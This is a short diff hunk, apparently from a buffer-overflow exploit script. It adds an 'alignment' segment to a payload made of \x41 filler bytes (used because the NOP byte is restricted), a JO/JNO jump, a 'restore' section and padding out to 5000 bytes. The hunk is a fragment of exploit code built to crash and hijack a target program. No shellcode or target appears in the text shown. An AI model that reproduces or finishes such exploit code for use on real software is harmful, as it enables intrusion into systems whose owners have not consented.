@@ -441,6 +441,7 @@ payload += "\x41" * 124
 payload += "\x70\x79\x71\x79"		# JO or JNO only 121 bytes
 payload += "\x41" * 121			# NOP is in the restricted characters. Using \x41 as a slide into alignment
 payload += restore
+payload += alignment
 payload += "\x43" * (5000-len(payload))
 
 
